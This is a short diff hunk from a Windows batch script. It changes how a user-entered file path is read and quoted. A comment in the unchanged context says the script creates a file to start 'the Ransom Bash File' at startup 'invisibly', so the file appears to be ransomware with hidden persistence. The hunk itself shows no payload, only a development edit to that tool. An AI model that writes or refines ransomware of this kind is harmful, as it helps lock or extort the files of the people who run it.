@@ -32,7 +32,8 @@ echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 echo   Please enter the path of the file 
 echo         did you want to verify
 echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-set /p web= :  C:\users\%username%\
+set /p web1= :  C:\users\%username%\
+set web="C:\users\%username%\%web1%"
 
 ::Create A File To Start The Ransom Bash File At The Start Up, Invisibly::
 
